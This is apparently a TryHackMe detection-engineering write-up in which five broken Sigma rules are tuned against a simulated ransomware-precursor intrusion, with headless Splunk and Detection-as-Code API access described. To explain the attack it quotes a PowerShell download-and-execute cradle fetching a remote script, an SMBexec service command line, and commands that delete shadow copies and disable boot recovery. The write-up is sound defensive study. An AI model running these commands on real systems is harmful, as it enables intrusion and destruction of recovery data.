# Critical Condition (TryHackMe)

Room: Critical Condition — premium **Detection Engineering** room. THM Security Services (TSS) is
engaged for a Detection-as-Code (DaC) activity at Cedar Hollow Health Network after a silent
ransomware-precursor intrusion (actor **WARD SPIDER**) where no detections fired. You tune five
broken Sigma rules (one per kill-chain step) in a GitHub-style DaC app until the CI pipeline is green,
and answer investigation questions from Splunk (`index="dac_lab"`). Framed on **CVE-2025-32711
(EchoLeak-adjacent M365 Copilot AI command injection, CVSS 9.3)** as the class of silent attack.
Completed: 2026-11-02 | Target: <ip> (reverse-proxy HTTPS; direct VPN ports firewalled).

Solved fully headless from `C:\CTF` via `curl` against the lab's reverse-proxy URL — both the Splunk
REST search API and the DaC REST API (no browser needed).

## Answers

| Task | Question | Answer |
|---|---|---|
| 2 | Script downloaded by the attacker using the VPN executable | *(find it yourself)* |
| 2 | PR#1 flag | `THM{…}` |
| 2 | Account that ran the DCSync attack | *(find it yourself)* |
| 2 | PR#2 flag | `THM{…}` |
| 2 | When the SMBexec execution happened | *(find it yourself)* |
| 2 | PR#3 flag | `THM{…}` |
| 2 | Parent command line that deleted the shadow copies | *(find it yourself)* |
| 2 | PR#4 flag | `THM{…}` |
| 2 | First hostname persistence was installed on | *(find it yourself)* |
| 2 | PR#5 flag | `THM{…}` |

## Headless access

- Reverse-proxy root 302s to Splunk Web login; `/dac-site/` is an open JS SPA driven by `/dac-site/api/*`.
- **Splunk REST search:** `admin:<redacted-pw>`. Web login POST to `/en-US/account/login` (cval = the
  `cval` cookie), then search via `POST /en-US/splunkd/__raw/services/search/jobs` with
  `exec_mode=oneshot&output_mode=json`. CSRF: send header `X-Splunk-Form-Key: <splunkweb_csrf_token_8000
  cookie>` **and** `X-Requested-With: XMLHttpRequest` (the latter is what actually clears CSRF).
- **DaC REST API** (no auth; it talks to Splunk server-side):
  - `GET /dac-site/api/prs`, `GET /dac-site/api/prs/{id}`, `GET /dac-site/api/files/{path}`
  - `PUT /dac-site/api/prs/{id}/rule {content}` — edit the rule (resets prior check state)
  - `POST /dac-site/api/prs/{id}/checks/{syntax|convert|validate|redteam}` — run checks **in order**
  - `POST /dac-site/api/prs/{id}/{approve|merge}` — flag is returned in the merged PR's `flagComment.flag`
- **Pipeline scoring:** `validate` runs the converted SPL and scores `truePos/falsePos/falseNeg`
  against a hidden `answer_detection` (need TP = total, FP = 0). `redteam` is an adversarial
  generalisation test with named sub-tests — passing validate is not enough, the rule must also
  catch technique variants without false-positiving the benign routines in `docs/environment-routines.md`.

## The intrusion (from `threat-intel/incident_report.md`) and the five detections

1. **PR#1 — VPN webshell (T1190).** `NetGateWorker.exe` on `VPN-GW01` spawned `cmd.exe`/`powershell`.
   The encoded PS one-liner decodes to `IEX (New-Object Net.WebClient).DownloadString('http://<ip>/<redacted>.ps1')`
   → script *(find it yourself)* (read it off the decoded DownloadString URL). Broken rule only matched `certutil` ("a variant that never occurs").
   Fix: `ParentImage|contains '\NetGate'` (whole appliance package, not just the worker) × a LOLBin
   child list (`cmd`, `powershell`, `certutil`, `msiexec`, `wscript`, `rundll32`, …).
2. **PR#2 — DCSync (T1003.006).** 4662 Directory Service Access with **AccessMask `0x100`** + the
   replication GUIDs `{1131f6aa-…}` / `{1131f6ad-…}` from a non-DC principal → the offending service account *(find it yourself)*.
   Broken rule used `0x20` and filtered `SubjectUserName|contains '$'` (unsafe — drops every machine
   account). Fix: `0x100` + GUIDs, and exclude only the named benign replicators `DC-CHHN01$`,
   `DC-CHHN02$`, `svc_dirsync`.
3. **PR#3 — SMBExec lateral movement (T1021.002).** 7045 service `TVXR8F3K` on `BKP-CHHN01` at
   *(find it yourself)*, `ServiceFileName = cmd.exe /Q /c echo whoami ^> \\127.0.0.1\ADMIN$\__…
   execute.bat`, `AccountName LocalSystem`. Broken rule pinned the wrong hosts (DCs) and wrong artifact
   (`powershell`). Fix: `ServiceFileName|contains|all ['cmd.exe', '$\']` (any host, any admin-share
   redirect, with/without `/Q`) and exclude the one benign remote-exec tool by its account
   (`svc_itops_exec` — the routine confirmed by *account*, not service-name prefix).
4. **PR#4 — Inhibit system recovery (T1490).** Five commands under the SMBExec `cmd.exe` wrapper on
   `BKP-CHHN01`: `vssadmin delete shadows /all /quiet`, `wmic shadowcopy delete`, `wbadmin delete
   catalog -quiet`, `bcdedit … recoveryenabled no`, `bcdedit … bootstatuspolicy ignoreallfailures`.
   Their shared **ParentCommandLine** is the fixed wrapper (see answer table). Broken rule only matched
   `vssadmin … resize shadowstorage` (benign storage op). Fix: match the destructive command strings
   (+ `diskshadow.exe` binary for the scripted variant) and exclude only when `ParentImage|endswith
   '\CHHNBackupAgent.exe'` (the backup agent doing its scoped `/for=D: /oldest` housekeeping) — filter
   by the *process*, not the `/for=` flag an attacker could add.
5. **PR#5 — Mass-deployment staging (T1569.002).** 7045 `svchost32` → `C:\Windows\Temp\svchost.exe`,
   LocalSystem, repeated on the first host *(find it yourself)* (04:05:30, first), then `CHHN-PC11`, `CHHN-PC27`, `FS-EHR01`.
   Broken rule matched only the literal `PSEXESVC` and then filtered out everything with `.exe`. Fix:
   detect a binary staged from a LOLBin dir (`\Windows\Temp\`, `\Users\Public\`, `\AppData\Local\Temp\`,
   …, `|endswith '.exe'` to skip the `.bat` cmd-wrappers) **or** a core-process name
   (`svchost/lsass/services/…`), and whitelist only the **exact** legit paths
   `C:\Windows\System32\svchost.exe` (exact-match, so a `System32\<subfolder>\svchost.exe` masquerade
   is still caught) — not `startswith System32`. Benign fleet patch tool (`svc_patchmgmt`,
   `C:\ProgramData\ITOpsPatch\`) is never in a staging dir, so no FP.

## Key lessons

- **Agentless silent attacks evade failure-based alerting.** Every action used a permitted account and
  permitted tool and succeeded — the signal is *behavioural/positional*, not an error. Detection
  engineering closes the gap the SOC's "something broke" alerts never see (the room's framing of
  CVE-2025-32711).
- **Tune to the technique, then exclude benign by identity.** Every fix followed the same shape: catch
  the technique broadly (any host, any variant) and subtract the *named* benign routine by the field
  that actually confirms it — service **account** (`svc_itops_exec`, `svc_patchmgmt`), parent
  **process** (`CHHNBackupAgent.exe`), specific **machine accounts** (`DC-CHHN01$/02$`) — never a
  cosmetic that an attacker can copy (a service-name prefix, a `/for=` flag, a `$` in the username).
- **`redteam` (adversarial test) > `validate` (replay).** Passing validate just means you matched the
  recorded attack. The redteam sub-tests force generalisation: `D$` vs `ADMIN$`, cmd without `/Q`,
  `diskshadow` vs `vssadmin`, `AppData\Local\Temp` staging, a subfolder-of-System32 masquerade. This is
  the difference between a brittle IOC rule and a real detection.
- **DaC = detections reviewed and tested like code**, in PRs with a CI pipeline (syntax → Sigma convert
  → environment validation → red-team) before merge/deploy. Directly reusable method for the AI-security
  video's "how a defender would actually ship a detection" angle.
